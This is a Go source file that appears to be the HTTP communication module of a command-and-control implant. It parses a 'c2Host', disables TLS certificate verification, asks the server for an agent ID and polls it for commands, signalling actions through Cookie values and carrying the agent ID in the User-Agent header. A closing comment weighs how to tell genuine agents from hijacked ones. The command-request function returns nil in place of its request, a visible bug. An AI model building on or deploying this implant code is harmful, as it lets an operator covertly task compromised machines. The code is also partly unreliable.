package internal

import (
	"crypto/tls"
	"net/http"
	"net/url"
)

// HttpConn
// Contains info on http connection
type HttpConn struct {
	Id     string
	host   *url.URL
	client *http.Client
}

// NewHttpConn
// Creates new HttpConn object
func NewHttpConn(c2Host string) (*HttpConn, error) {
	// Parse c2Host url
	parsedUrl, err := url.Parse(c2Host)
	if err != nil {
		return nil, err
	}

	// Create HttpConn object with our data
	return &HttpConn{
		host: parsedUrl,
		client: &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}, nil
}

// HttpConn.SendRequest
// Send http request
func (hc *HttpConn) SendRequest(req *http.Request) (*http.Response, error) {
	resp, err := hc.client.Do(req)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// HttpConn.NewIdRequest
// Creates new agent id request object
func (hc *HttpConn) NewIdRequest() (*http.Request, error) {
	// Create request object
	req, err := http.NewRequest("GET", hc.host.String(), nil)
	if err != nil {
		return nil, err
	}

	// Set header to indicate action to c2
	req.Header.Set("Cookie", "id")
	return req, nil
}

// Send a new task request
func (hc *HttpConn) NewCmdRequest() (*http.Request, error) {
	req, err := http.NewRequest("GET", hc.host.String(), nil)
	if err != nil {
		return nil, err
	}
	// agent ID should already have been recv -- need to know ID for which agent to send a command to
	req.Header.Set("Cookie", "cmd")
	req.Header.Set("User-Agent", hc.Id)
	return nil, err
}

/*
	We don't control system an agent is on, so its hard to verify the agent is actually ours

	Even w/ keys etc a reverse engineer can still reverse a auth method and hide their control
*/
